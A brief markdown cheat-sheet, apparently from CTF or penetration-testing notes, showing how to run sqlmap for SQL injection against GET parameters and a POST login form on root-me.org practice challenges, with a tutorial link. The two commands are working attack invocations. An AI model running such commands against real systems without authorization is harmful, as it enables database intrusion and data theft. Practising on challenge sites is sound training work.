# SQLMap

Enumerate and extract data from SQL databases


## GET request

SQL-injection in URL's (GET requests):
```bash
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"
```

## POST request
SQL-injection in POST params (eg. login-forms)
```bash
sqlmap --method=POST -u "http://challenge01.root-me.org/web-serveur/ch9/" --data="login=admin&password=poo"
```

Tutorials:
* [Basic](https://www.youtube.com/watch?v=yPMbb38pwVI)
